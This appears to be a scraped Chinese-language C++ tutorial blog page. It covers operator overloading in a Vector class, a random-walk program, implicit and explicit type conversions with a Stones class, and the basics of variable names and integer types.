123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129// filepath: d:\\ProgramData\\files_Cpp\\250424\\vector.cpp#include &lt;cmath&gt; // 为了使用 sqrt, atan, atan2, sin, cos#include &quot;vector.h&quot; // 包含类定义namespace VECTOR &#123; // 角度转换常量 (如果 cmath 没有定义 M_PI) const double Rad_to_deg = 180.0 / 3.141592653589793; // --- 私有辅助函数 --- void Vector::set_mag() &#123; mag = std::sqrt(x * x + y * y); &#125; void Vector::set_ang() &#123; if (x == 0.0 &amp;&amp; y == 0.0) ang = 0.0; else ang = std::atan2(y, x); // atan2 处理所有象限 &#125; void Vector::set_x() &#123; x = mag * std::cos(ang); &#125; void Vector::set_y() &#123; y = mag * std::sin(ang); &#125; // --- 公有方法 --- Vector::Vector() &#123; // 默认构造函数 x = y = mag = ang = 0.0; mode = RECT; &#125; // 根据模式构造 Vector::Vector(double n1, double n2, Mode form) &#123; mode = form; if (form == RECT) &#123; x = n1; y = n2; set_mag(); set_ang(); &#125; else if (form == POL) &#123; mag = n1; ang = n2 / Rad_to_deg; // 将角度转换为弧度 set_x(); set_y(); &#125; else &#123; std::cerr &lt;&lt; &quot;Incorrect 3rd argument to Vector() -- &quot;; std::cerr &lt;&lt; &quot;vector set to 0\\n&quot;; x = y = mag = ang = 0.0; mode = RECT; &#125; &#125; // 重置矢量 void Vector::reset(double n1, double n2, Mode form) &#123; mode = form; if (form == RECT) &#123; x = n1; y = n2; set_mag(); set_ang(); &#125; else if (form == POL) &#123; mag = n1; ang = n2 / Rad_to_deg; // 角度转弧度 set_x(); set_y(); &#125; else &#123; std::cerr &lt;&lt; &quot;Incorrect 3rd argument to Vector::reset() -- &quot;; std::cerr &lt;&lt; &quot;vector set to 0\\n&quot;; x = y = mag = ang = 0.0; mode = RECT; &#125; &#125; Vector::~Vector() &#123; // 析构函数 &#125; void Vector::polar_mode() &#123; mode = POL; &#125; void Vector::rect_mode() &#123; mode = RECT; &#125; // --- 运算符重载实现 --- // 加法 (通常在直角坐标下计算) Vector Vector::operator+(const Vector &amp; b) const &#123; return Vector(x + b.x, y + b.y); // 返回一个新的 Vector 对象 &#125; // 减法 Vector Vector::operator-(const Vector &amp; b) const &#123; return Vector(x - b.x, y - b.y); &#125; // 取反 Vector Vector::operator-() const &#123; return Vector(-x, -y); &#125; // 乘法 (Vector * double) Vector Vector::operator*(double n) const &#123; return Vector(x * n, y * n); &#125; // --- 友元函数实现 --- // 乘法 (double * Vector) Vector operator*(double n, const Vector &amp; a) &#123; return a * n; // 调用成员函数 a.operator*(n) &#125; // 输出 (根据模式选择输出格式) std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Vector &amp; v) &#123; if (v.mode == Vector::RECT) &#123; os &lt;&lt; &quot;(x,y) = (&quot; &lt;&lt; v.x &lt;&lt; &quot;, &quot; &lt;&lt; v.y &lt;&lt; &quot;)&quot;; &#125; else if (v.mode == Vector::POL) &#123; os &lt;&lt; &quot;(m,a) = (&quot; &lt;&lt; v.mag &lt;&lt; &quot;, &quot; &lt;&lt; v.ang * Rad_to_deg &lt;&lt; &quot;)&quot;; // 输出角度 &#125; else &#123; os &lt;&lt; &quot;Vector object mode is invalid&quot;; &#125; return os; &#125;&#125; // end namespace VECTOR 11.5.2 为 Vector 类重载算术运算符我们在上面的代码中已经实现了几个运算符的重载： operator+: 两个 Vector 相加，返回一个新的 Vector。计算在直角坐标下进行。 operator-: 两个 Vector 相减，返回一个新的 Vector。 operator- (一元): 对 Vector 取反，返回一个新的 Vector。 operator*: Vector 乘以一个 double，返回一个新的 Vector。 operator* (友元): double 乘以一个 Vector，通过调用成员函数版本实现。 operator&lt;&lt; (友元): 将 Vector 输出到 ostream，根据当前模式选择输出格式。 11.5.3 对实现的说明 命名空间: 将 Vector 类及其相关函数放入 VECTOR 命名空间，以避免潜在的名称冲突。 坐标计算: 算术运算（加、减、乘）通常在直角坐标下执行更简单。即使对象是以极坐标模式创建或设置的，内部的 x 和 y 值也会被计算出来，运算基于这些值进行。结果对象默认以直角坐标模式创建，但其 mag 和 ang 也会被计算。 角度单位: 内部计算（如 sin, cos, atan2）使用弧度。构造函数和 reset 接受角度值（如果是极坐标模式），并将其转换为弧度存储。angval() 和 operator&lt;&lt; 在显示时将内部的弧度转换回角度。 友元函数: operator* (double * Vector) 和 operator&lt;&lt; 被实现为友元函数，原因与 Time 类中的类似：operator* 需要处理 double 作为左操作数的情况，operator&lt;&lt; 需要 ostream 作为左操作数，并且它们都需要访问 Vector 的私有成员。 11.5.4 使用 Vector 类来模拟随机漫步现在我们可以使用 Vector 类来模拟一个简单的物理过程：随机漫步。假设一个人从原点出发，每次随机选择一个方向行走固定的一段距离，重复多次，我们想知道他最终的位置。 randwalk.cpp (主程序) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// filepath: d:\\ProgramData\\files_Cpp\\250424\\randwalk.cpp#include &lt;iostream&gt;#include &lt;cstdlib&gt; // 提供 rand(), srand() 原型#include &lt;ctime&gt; // 提供 time() 原型#include &quot;vector.h&quot; // 包含 Vector 类定义 (假设在同一目录或包含路径中)int main() &#123; using namespace std; using VECTOR::Vector; // 使用 VECTOR 命名空间中的 Vector srand(time(0)); // 初始化随机数生成器 double direction; Vector step; // 当前一步的矢量 Vector result(0.0, 0.0); // 从原点开始的总位移 unsigned long steps = 0; // 总步数 double target; // 目标距离 double dstep; // 每步的距离 cout &lt;&lt; &quot;Enter target distance (q to quit): &quot;; while (cin &gt;&gt; target) &#123; // 循环直到输入非数字 cout &lt;&lt; &quot;Enter step length: &quot;; if (!(cin &gt;&gt; dstep)) break; // 如果步长输入无效则退出 cout &lt;&lt; &quot;Target Distance: &quot; &lt;&lt; target &lt;&lt; &quot;, Step Size: &quot; &lt;&lt; dstep &lt;&lt; endl; cout &lt;&lt; steps &lt;&lt; &quot;: &quot; &lt;&lt; result &lt;&lt; endl; // 输出初始位置 // 开始随机漫步 while (result.magval() &lt; target) &#123; // 只要还没达到目标距离 direction = rand() % 360; // 随机生成 0-359 度的方向 step.reset(dstep, direction, Vector::POL); // 设置当前步的矢量 (极坐标) result = result + step; // 将当前步加到总位移上 steps++; cout &lt;&lt; steps &lt;&lt; &quot;: &quot; &lt;&lt; result &lt;&lt; endl; // 输出当前位置 &#125; // 输出最终结果 cout &lt;&lt; &quot;After &quot; &lt;&lt; steps &lt;&lt; &quot; steps, the subject &quot; &quot;has the following location:\\n&quot;; cout &lt;&lt; result &lt;&lt; endl; // 输出最终位置 (默认直角坐标) result.polar_mode(); // 切换到极坐标模式 cout &lt;&lt; &quot; or\\n&quot; &lt;&lt; result &lt;&lt; endl; // 输出最终位置 (极坐标) cout &lt;&lt; &quot;Average outward distance per step = &quot; &lt;&lt; result.magval() / steps &lt;&lt; endl; // 计算平均每步移动的直线距离 // 重置以便下一次模拟 steps = 0; result.reset(0.0, 0.0); cout &lt;&lt; &quot;\\nEnter target distance (q to quit): &quot;; &#125; cout &lt;&lt; &quot;Bye!\\n&quot;; cin.clear(); // 清除可能的错误状态 while (cin.get() != &#x27;\\n&#x27;) // 清空输入缓冲区 continue; return 0;&#125; 编译和运行: 你需要将 vector.cpp 和 randwalk.cpp 一起编译链接。 12g++ randwalk.cpp vector.cpp -o randwalk -lm # 可能需要链接数学库 (-lm)./randwalk 程序会提示你输入目标距离和每步的长度，然后模拟随机漫步过程，打印每一步后的位置，直到达到目标距离，最后输出总结信息。这个例子很好地展示了如何利用运算符重载使类的使用（如 result = result + step;）变得直观和方便。 11.6 类的自动转换和强制类型转换C++ 是一种强类型语言，但它也允许在不同类型之间进行转换。我们已经熟悉了内置类型之间的转换（例如 int 到 double）。C++ 也允许定义类类型与其它类型（包括内置类型和其他类类型）之间的转换规则。这种转换可以是自动（隐式）发生的，也可以是需要显式请求的（强制类型转换）。 11.6.1 隐式转换：使用构造函数如果一个类的构造函数可以用单个参数来调用（要么它只有一个参数，要么它有多个参数但第一个参数之后的所有参数都有默认值），那么这个构造函数就定义了一个从其参数类型到该类类型的隐式转换规则。 示例： 假设我们有一个简单的 Stones 类，表示英石（一种重量单位），并且我们想允许从 double（表示磅）自动转换为 Stones。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283// stones.h#ifndef STONES_H_#define STONES_H_class Stones &#123;private: enum &#123; Lbs_per_stn = 14 &#125;; // 每英石包含的磅数 int stone; // 整数部分的英石 double pds_left; // 剩余的小数磅数 double pounds; // 总磅数public: // 构造函数：接受总磅数 (double) Stones(double lbs); // 默认构造函数 Stones(); ~Stones(); void show_lbs() const; // 以磅显示 void show_stn() const; // 以英石格式显示&#125;;#endif // STONES_H_// stones.cpp#include &lt;iostream&gt;#include &quot;stones.h&quot;Stones::Stones(double lbs) &#123; pounds = lbs; stone = int(lbs) / Lbs_per_stn; // 整数英石 pds_left = int(lbs) % Lbs_per_stn + lbs - int(lbs); // 剩余磅数&#125;Stones::Stones() &#123; stone = pounds = pds_left = 0;&#125;Stones::~Stones() &#123;&#125;void Stones::show_lbs() const &#123; std::cout &lt;&lt; pounds &lt;&lt; &quot; pounds\\n&quot;;&#125;void Stones::show_stn() const &#123; std::cout &lt;&lt; stone &lt;&lt; &quot; stone, &quot; &lt;&lt; pds_left &lt;&lt; &quot; pounds\\n&quot;;&#125;// main.cpp#include &lt;iostream&gt;#include &quot;stones.h&quot;void display(const Stones &amp; st, int n); // 函数接受 Stones 对象int main() &#123; Stones incognito = 275; // 隐式转换: 调用 Stones(275.0) Stones wolfe(285.7); // 显式调用构造函数 Stones taft = 325; // 隐式转换: 调用 Stones(325.0) std::cout &lt;&lt; &quot;Incognito weighs &quot;; incognito.show_stn(); std::cout &lt;&lt; &quot;Wolfe weighs &quot;; wolfe.show_stn(); std::cout &lt;&lt; &quot;Taft weighs &quot;; taft.show_stn(); incognito = 276.8; // 隐式转换: 调用 Stones(276.8), 然后赋值 taft = Stones(330); // 显式转换 (调用构造函数) std::cout &lt;&lt; &quot;After dinner, Incognito weighs &quot;; incognito.show_stn(); std::cout &lt;&lt; &quot;After dinner, Taft weighs &quot;; taft.show_stn(); display(19.99, 2); // 隐式转换: 19.99 转换为临时 Stones 对象传递给函数 return 0;&#125;void display(const Stones &amp; st, int n) &#123; for (int i = 0; i &lt; n; i++) &#123; std::cout &lt;&lt; &quot;Wow! &quot;; st.show_stn(); &#125;&#125; 在 main 函数中： Stones incognito = 275; 和 Stones taft = 325;：整数 275 和 325 首先被提升为 double，然后编译器使用 Stones(double) 构造函数创建了一个临时的 Stones 对象，并用这个临时对象来初始化 incognito 和 taft（在现代 C++ 中，这通常会被优化，直接在目标对象上构造，称为复制省略）。 incognito = 276.8;：double 值 276.8 被用来创建一个临时的 Stones 对象，然后该临时对象通过赋值运算符（这里是默认的赋值运算符）赋给 incognito。 display(19.99, 2);：double 值 19.99 被用来创建一个临时的 Stones 对象，这个临时对象作为参数传递给 display 函数。 这种隐式转换有时很方便，但也可能导致意想不到的行为或错误，特别是当转换不是程序员的本意时。 使用 explicit 关键字 为了禁止构造函数用于隐式转换，可以在构造函数声明前加上 explicit 关键字。 123456789101112// stones.h (修改后)// ...class Stones &#123; // ...public: // 使用 explicit 禁止隐式转换 explicit Stones(double lbs); Stones(); ~Stones(); // ...&#125;;// ... 如果使用了 explicit，那么之前的隐式转换代码将不再合法： 123456789101112131415161718192021// main.cpp (使用 explicit Stones 后)int main() &#123; // Stones incognito = 275; // 错误！不能隐式转换 // Stones taft = 325; // 错误！不能隐式转换 Stones wolfe(285.7); // OK: 显式调用构造函数 Stones incognito = Stones(275); // OK: 显式转换 (调用构造函数) Stones taft(325); // OK: 显式调用构造函数 // incognito = 276.8; // 错误！不能隐式转换后赋值 incognito = Stones(276.8); // OK: 显式转换后赋值 // display(19.99, 2); // 错误！不能隐式转换参数 display(Stones(19.99), 2); // OK: 显式转换参数 // 强制类型转换也允许 display((Stones)20.5, 1); // C 风格强制转换 display(static_cast&lt;Stones&gt;(21.2), 1); // C++ 风格强制转换 return 0;&#125; 建议: 通常建议将只接受一个参数的构造函数声明为 explicit，除非你确实希望进行该类型的隐式转换。这可以防止许多潜在的错误。 11.6.2 转换函数：operator typeName()构造函数提供了从其他类型到类类型的转换。如果我们想定义从类类型转换到其他类型（如 double 或 int）的规则，我们需要使用**转换函数 (Conversion Function)**。 转换函数是一种特殊的类成员函数，形式为 operator typeName()。 特点: 名称: operator 关键字后跟目标类型名 typeName。 无返回类型声明: 函数头不能指定返回类型（即使它确实会返回一个 typeName 类型的值）。 无参数: 转换函数必须是没有参数的成员函数。 必须是成员函数: 不能是静态成员函数或友元函数。 示例：为 Stones 添加转换为 double 和 int 的函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// stones.h (添加转换函数)// ...class Stones &#123; // ...public: explicit Stones(double lbs); Stones(); ~Stones(); void show_lbs() const; void show_stn() const; // 转换函数：转换为 double (总磅数) operator double() const; // 转换函数：转换为 int (四舍五入的总磅数) operator int() const;&#125;;// ...// stones.cpp (添加转换函数定义)// ...Stones::operator double() const &#123; return pounds; // 返回总磅数&#125;Stones::operator int() const &#123; // 四舍五入到最近的整数磅 return int(pounds + 0.5);&#125;// ...// main.cpp (使用转换函数)#include &lt;iostream&gt;#include &quot;stones.h&quot;int main() &#123; Stones poppins(9, 2.8); // 9 stone, 2.8 pounds double p_wt = poppins; // 隐式转换: 调用 poppins.operator double() int int_wt = poppins; // 隐式转换: 调用 poppins.operator int() std::cout &lt;&lt; &quot;Poppins weighs &quot; &lt;&lt; p_wt &lt;&lt; &quot; pounds.\\n&quot;; std::cout &lt;&lt; &quot;Poppins weighs &quot; &lt;&lt; int_wt &lt;&lt; &quot; pounds (rounded).\\n&quot;; // 也可以显式调用 double p_wt_explicit = double(poppins); int int_wt_explicit = int(poppins); std::cout &lt;&lt; &quot;Explicit double: &quot; &lt;&lt; p_wt_explicit &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Explicit int: &quot; &lt;&lt; int_wt_explicit &lt;&lt; std::endl; return 0;&#125; 输出: 1234Poppins weighs 128.8 pounds.Poppins weighs 129 pounds (rounded).Explicit double: 128.8Explicit int: 129 explicit 转换函数 (C++11) 与构造函数类似，C++11 允许将转换函数声明为 explicit，以防止它们被用于隐式转换。如果转换函数是 explicit 的，那么只能在需要显式转换的上下文中使用（例如，使用 static_cast 或直接初始化）。 123456789101112131415161718192021222324252627// stones.h (使用 explicit 转换函数)class Stones &#123; // ...public: // ... explicit operator double() const; explicit operator int() const;&#125;;// main.cpp (使用 explicit 转换函数后)int main() &#123; Stones poppins(9, 2.8); // double p_wt = poppins; // 错误！不能隐式转换 // int int_wt = poppins; // 错误！不能隐式转换 // 需要显式转换 double p_wt = static_cast&lt;double&gt;(poppins); int int_wt = static_cast&lt;int&gt;(poppins); std::cout &lt;&lt; &quot;Poppins weighs &quot; &lt;&lt; p_wt &lt;&lt; &quot; pounds.\\n&quot;; std::cout &lt;&lt; &quot;Poppins weighs &quot; &lt;&lt; int_wt &lt;&lt; &quot; pounds (rounded).\\n&quot;; // if (poppins) &#123; ... &#125; // 如果 operator bool() 是 explicit，这里也会报错 if (static_cast&lt;bool&gt;(poppins)) &#123; /* ... */ &#125; // 需要显式转换 return 0;&#125; 将转换函数设为 explicit 通常也是一个好主意，除非隐式转换确实是你想要的行为（例如 operator bool() 在条件语句中的使用，但在 C++11 后也推荐 explicit operator bool()）。 11.6.3 转换函数和友元函数转换函数和接受单参数的构造函数都可能导致二义性问题，尤其是在与重载运算符（特别是友元函数）一起使用时。 二义性示例: 考虑之前的 Vector 类和 Vector operator*(double n, const Vector &amp; a); 友元函数。如果我们为 Vector 添加一个接受 double 的构造函数（可能表示创建一个大小为 double、角度为 0 的向量）和一个转换为 double 的函数（可能返回向量的大小 magval()），会发生什么？ 1234567891011121314151617// vector.h (假设添加了转换构造函数和函数)namespace VECTOR &#123; class Vector &#123; // ... public: Vector(double val); // 转换构造函数 (可能不 explicit) operator double() const; // 转换函数 (可能不 explicit) // ... friend Vector operator*(double n, const Vector &amp; a); &#125;;&#125;// main.cppVECTOR::Vector result;VECTOR::Vector vec(10.0, 20.0);double factor = 2.0;result = factor * vec; // 潜在的二义性！ 编译器在处理 factor * vec 时，可能会有两种解释： 调用友元函数: operator*(factor, vec)，这是我们原本期望的。 使用转换函数: 将 vec 转换为 double（通过 vec.operator double()），然后执行 double * double 的内置乘法。 如果 Vector(double) 和 operator double() 都存在且都不是 explicit，编译器通常会因为无法确定使用哪个转换路径而报告**二义性错误 (ambiguity error)**。 解决方法: 使用 explicit: 将转换构造函数和转换函数声明为 explicit，可以消除隐式转换带来的二义性。用户必须显式指定转换。 提供精确匹配的函数: 如果只提供了 operator*(double, const Vector&amp;)，而没有提供 operator double()，那么编译器会优先选择精确匹配的友元函数，不会产生二义性。 避免定义相互冲突的转换: 在设计类时，仔细考虑可能需要的转换，避免同时提供从类型 A 到类型 B 以及从类型 B 到类型 A 的隐式转换，或者提供多个可能导致相同结果的转换路径。 总结: 接受单个参数的构造函数定义了从参数类型到类类型的隐式转换，除非使用 explicit 阻止。 转换函数 operator typeName() 定义了从类类型到 typeName 类型的转换，可以是隐式的，除非使用 explicit (C++11) 阻止。 隐式转换虽然方便，但可能导致意外行为和二义性。优先使用 explicit 来控制转换。 当存在多个转换路径（通过构造函数或转换函数）可以使表达式合法时，编译器可能会遇到二义性问题。 在设计类时，应谨慎考虑转换需求，避免引入不必要的或有歧义的转换规则。 11.7 总结本章重点介绍了如何通过运算符重载、友元和类型转换等特性来扩展类的功能，使其使用起来更自然、更强大。 主要内容回顾： 运算符重载 (Operator Overloading): 允许为类定义标准 C++ 运算符（如 +, -, *, &lt;&lt;）的行为。 目的是提高代码的可读性和直观性，使类对象的运算类似于内置类型。 通过定义运算符函数（operator+, operator&lt;&lt; 等）来实现。 运算符函数可以是成员函数或非成员函数（通常是友元）。 重载不能改变运算符的优先级、结合性或操作数个数，也不能创建新运算符。某些运算符（如 .、::、sizeof）不能被重载。 Time 类的示例演示了如何重载 +, -, * 等算术运算符。 友元 (Friends): 允许非成员函数或整个类访问另一个类的 private 和 protected 成员。 通过在类定义内部使用 friend 关键字声明。 友元函数常用于重载那些不能作为成员函数（如 &lt;&lt;, &gt;&gt;）或需要对称处理操作数（如 double * Vector）的运算符。 友元类允许一个类的所有成员函数访问另一个类的私有部分，适用于需要紧密协作的类。 成员函数 vs. 非成员函数 (Operator Overloading Choice): 赋值 (=)、下标 ([])、函数调用 (())、成员访问 (-&gt;) 运算符必须是成员函数。 修改对象状态的运算符（如 +=, ++）通常实现为成员函数。 需要对称性或允许左操作数进行类型转换的运算符（如 +, *, ==）以及输入/输出运算符 (&lt;&lt;, &gt;&gt;) 通常实现为非成员友元函数。 Vector 类示例: 演示了如何设计一个包含状态（直角/极坐标模式）的类。 进一步展示了算术运算符 (+, -, unary -, *) 和输出运算符 (&lt;&lt;) 的重载。 通过随机漫步模拟展示了 Vector 类的实际应用。 类的类型转换: 构造函数转换: 接受单个参数的构造函数（除非声明为 explicit）定义了从参数类型到类类型的隐式转换。 转换函数: operator typeName() 形式的成员函数（除非声明为 explicit）定义了从类类型到 typeName 类型的隐式转换。 explicit 关键字: 用于阻止构造函数和转换函数进行隐式转换，提高代码安全性，避免意外转换和二义性。 二义性: 当存在多个转换路径（通过构造函数或转换函数）时，可能导致编译错误。应谨慎设计转换规则或使用 explicit。 通过合理运用运算符重载、友元和类型转换，可以创建出功能丰富、易于使用且表达力强的 C++ 类。然而，这些特性也需要谨慎使用，以避免引入不必要的复杂性或潜在的错误。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 3 处理数据","slug":"Cpp_tutorial_Chapter_3","date":"2025-04-26T12:03:35.410Z","updated":"2025-04-26T12:01:21.849Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_3/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_3/","excerpt":"","text":"3.1 简单变量在第2章中，我们已经接触了变量的声明和使用。本章将深入探讨C++的基本数据类型，首先从用于存储数字和字符的简单变量开始。简单变量是C++中存储数据的基本单元。 3.1.1 变量名变量名是赋予内存位置的标识符，用于访问存储在该位置的数据。在C++中，选择有意义的变量名是良好编程实践的一部分。 命名规则: 字符集: 变量名只能包含字母（大小写）、数字和下划线 _。 首字符: 名称的第一个字符不能是数字。 区分大小写: C++是大小写敏感的，myVariable 和 myvariable 是两个不同的变量名。 不能是关键字: 不能使用C++关键字（如 int, double, return, if, class 等）作为变量名。 长度限制: C++对名称的长度没有硬性规定，但长名称可能会在某些旧编译器或链接器上遇到问题。通常，有意义且不过于冗长的名称是最好的。 下划线的使用: 以两个下划线 __ 开头或以下划线和大写字母 _A 到 _Z 开头的名称被保留给编译器及其使用的资源使用。 以下划线 _ 开头的名称被保留用作全局标识符。 虽然在某些情况下可以使用以下划线开头的名称（例如在函数内部），但最好避免这种用法，以防与系统使用的名称冲突。 命名约定 (非强制，但推荐): 有意义: 变量名应反映其存储的数据或用途（例如 numberOfStudents, userName, totalScore）。 驼峰命名法 (Camel Case): 从第二个单词开始，每个单词的首字母大写（例如 myVariableName, studentAge）。这是C++中常见的风格。 下划线分隔 (Snake Case): 使用下划线分隔单词（例如 my_variable_name, student_age）。这也是一种常见的风格。 选择一种风格并保持一致。 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; // 合法的变量名 int age; double accountBalance; char first_initial; long long populationOfEarth; int _internal_counter; // 合法，但不推荐在全局使用 int value2; // 非法的变量名 // int 1stPlace; // 不能以数字开头 // double account Balance; // 不能包含空格 // int return; // 不能是关键字 // char my-char; // 不能包含连字符 &#x27;-&#x27; // 区分大小写 int count = 10; int Count = 20; std::cout &lt;&lt; &quot;count: &quot; &lt;&lt; count &lt;&lt; std::endl; // 输出 10 std::cout &lt;&lt; &quot;Count: &quot; &lt;&lt; Count &lt;&lt; std::endl; // 输出 20 return 0;&#125; 3.1.2 整型整型 (Integer) 是没有小数部分的数字。C++提供了多种整型类型来存储整数，它们的主要区别在于占用的内存空间大小以及能够表示的数值范围。 计算机内存由称为位 (bit) 的单元组成。8个位组成一个**字节 (byte)**。每个位可以表示两种状态（通常是0或1）。字节是内存中最小的可寻址单元，意味着每个字节都有一个唯一的地址。 不同的整型类型使用不同数量的字节来存储值。使用的字节数越多，可以表示的整数范围就越大。 基本整型类型: short int long long long (C++11 新增) 我们将在下一节详细讨论这些类型。 用法与示例: 12345678910111213141516171819202122#include &lt;iostream&gt;int main() &#123; // 声明不同类型的整型变量 short smallNumber; int standardInteger; long largeInteger; long long veryLargeInteger; // 需要 C++11 或更高版本 // 赋值 smallNumber = 10; standardInteger = 10000; largeInteger = 1000000; veryLargeInteger = 10000000000LL; // LL 后缀表示 long long std::cout &lt;&lt; &quot;short: &quot; &lt;&lt; smallNumber &lt;&lt; std::endl; std::cout &lt;&lt; &quot;int: &quot; &lt;&lt; standardInteger &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long: &quot; &lt;&lt; largeInteger &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long long: &quot; &lt;&lt; veryLargeInteger &lt;&lt; std::endl; return 0;&#125; 3.1.3 整型short、int、long和long longC++标准规定了各种整型类型的最小尺寸（占用的内存位数），但具体尺寸可能因编译器和操作系统而异。 标准规定的最小尺寸: short: 至少16位。 int: 至少和 short 一样大，通常是系统处理效率最高的整数长度（例如，在32位系统上通常是32位，64位系统上可能是32位或64位）。 long: 至少32位，且至少和 int 一样大。 long long: 至少64位，且至少和 long 一样大。 如何查看具体尺寸: 可以使用 sizeof 运算符来查看特定类型在你的系统上占用的字节数。 用法与示例: 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;climits&gt; // 包含整型限制信息 (如 INT_MAX)int main() &#123; // 使用 sizeof 查看各种类型占用的字节数 std::cout &lt;&lt; &quot;Size of short: &quot; &lt;&lt; sizeof(short) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of int: &quot; &lt;&lt; sizeof(int) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long: &quot; &lt;&lt; sizeof(long) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long long: &quot; &lt;&lt; sizeof(long long) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 查看 int 类型的最大值 (需要 &lt;climits&gt;) std::cout &lt;&lt; &quot;Maximum value for int: &quot; &lt;&lt; INT_MAX &lt;&lt; std::endl; // 类似地，有 SHRT_MAX, LONG_MAX, LLONG_MAX 等 // 声明和初始化 short s_value = 32767; // 通常是 short 的最大值 (如果 short 是 16 位) int i_value = 2000000000; long l_value = 1000000000L; // L 后缀表示 long (可选，但有时有助于清晰) long long ll_value = 50000000000LL; // LL 后缀表示 long long std::cout &lt;&lt; &quot;short value: &quot; &lt;&lt; s_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;int value: &quot; &lt;&lt; i_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long value: &quot; &lt;&lt; l_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long long value: &quot; &lt;&lt; ll_value &lt;&lt; std::endl; // 溢出示例 (行为是未定义的或回绕) short max_short = SHRT_MAX; std::cout &lt;&lt; &quot;Max short: &quot; &lt;&lt; max_short &lt;&lt; std::endl; max_short = max_short + 1; // 尝试超出最大值 std::cout &lt;&lt; &quot;Max short + 1: &quot; &lt;&lt; max_short &lt;&lt; std::endl; // 可能变成负数 return 0;&#125; 注意: 当一个整数值超出了其类型所能表示的最大范围时，会发生溢出 (Overflow)**。对于有符号整数溢出，C++标准规定其行为是未定义的 (Undefined Behavior)**，这意味着任何事情都可能发生（程序崩溃、得到奇怪的结果等）。对于无符号整数溢出，行为是定义好的（通常是回绕，即从0重新开始）。 3.1.4 无符号类型对于每种整型（short, int, long, long long），都存在一个对应的无符号 (unsigned) 版本。无符号类型只能存储非负整数（0和正数）。 通过在类型名前加上 unsigned 关键字来声明无符号类型。 特点: 范围: 在相同的字节数下，无符号类型可以表示的最大值大约是有符号类型的两倍，因为它们不需要用一位来表示正负号。范围从 0 开始。 用途: 当你知道一个变量永远不会是负数时（例如，计数器、数组索引、人口数量等），使用无符号类型可以增大其可表示的正数范围。 回绕 (Wrap Around): 当无符号整数的值超出其最大范围时，它会从0重新开始（模运算）。例如，如果一个 unsigned short 的最大值是 65535，那么 65535 + 1 会变成 0。同样，0 - 1 会变成 65535。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;climits&gt; // 包含 UINT_MAX 等int main() &#123; // 声明无符号类型 unsigned short us_value; unsigned int ui_value; unsigned long ul_value; unsigned long long ull_value; // 查看大小和范围 std::cout &lt;&lt; &quot;Size of unsigned int: &quot; &lt;&lt; sizeof(unsigned int) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Maximum value for unsigned int: &quot; &lt;&lt; UINT_MAX &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 赋值 us_value = 65535; // 通常是 unsigned short 的最大值 (如果 short 是 16 位) ui_value = 4000000000U; // U 后缀表示 unsigned int ul_value = 8000000000UL; // UL 后缀 ull_value = 18000000000000000000ULL; // ULL 后缀 std::cout &lt;&lt; &quot;unsigned short: &quot; &lt;&lt; us_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned int: &quot; &lt;&lt; ui_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned long: &quot; &lt;&lt; ul_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned long long: &quot; &lt;&lt; ull_value &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 回绕示例 unsigned short test_wrap = USHRT_MAX; std::cout &lt;&lt; &quot;Max unsigned short: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; test_wrap = test_wrap + 1; std::cout &lt;&lt; &quot;Max unsigned short + 1: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; // 变为 0 test_wrap = 0; std::cout &lt;&lt; &quot;Unsigned short = 0&quot; &lt;&lt; std::endl; test_wrap = test_wrap - 1; std::cout &lt;&lt; &quot;Unsigned short - 1: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; // 变为 USHRT_MAX return 0;&#125; 注意: 混合使用有符号和无符号整数进行运算时要特别小心，因为有符号数可能会被隐式转换为无符号数，导致意外的结果，尤其是在比较运算中。 3.1.5 选择整型类型在选择使用哪种整型类型时，应考虑以下因素： 数值范围: 确保所选类型能够容纳你程序中需要存储的最大（和最小，如果是有符号）整数值。如果数值可能很大，优先考虑 long 或 long long。如果数值永远非负，可以考虑 unsigned 版本以获得更大的正数范围。 内存消耗: 如果内存非常宝贵（例如在嵌入式系统或处理大量数据时），并且确定数值范围较小，可以使用 short 来节省内存。 性能: int 通常被认为是计算机处理效率最高的整数类型。除非有明确的范围或内存需求，否则 int 是一个不错的默认选择。 可移植性: int 的大小可能因系统而异。如果需要确保在不同系统上具有固定的大小，可以使用 C++11 引入的固定宽度整数类型（在 &lt;cstdint&gt; 头文件中定义），例如 int16_t, uint32_t, int64_t 等。 代码清晰度: 选择最能自然表达意图的类型。如果变量代表一个永远不会为负的计数，unsigned int 可能比 int 更能表达这个意图。 